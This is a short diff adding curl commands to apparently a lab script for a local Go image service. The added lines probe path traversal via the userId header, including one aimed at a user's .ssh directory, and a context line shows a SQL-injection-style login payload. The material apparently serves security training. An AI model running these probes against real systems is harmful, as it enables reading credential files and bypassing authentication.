@@ -34,6 +34,12 @@ curl -v -X POST 'localhost:8081/login' -d "{ \"email\": \"gopher@golang.org' --\
 # List Images
 curl -H "userId:1" 'localhost:8081/images' | jq
 
+# Probe Path Traversal
+curl -H "userId:../" 'localhost:8081/images' | jq
+
+# Check for SSH Access
+curl -H "userId:../../../../../benji/.ssh/" 'localhost:8081/images' | jq
+
 # File Upload
 curl -sw 'Status Code: %{http_code}' -H "userId:10" -F 'file=@./gopherme.png' 'localhost:8081/images'
 
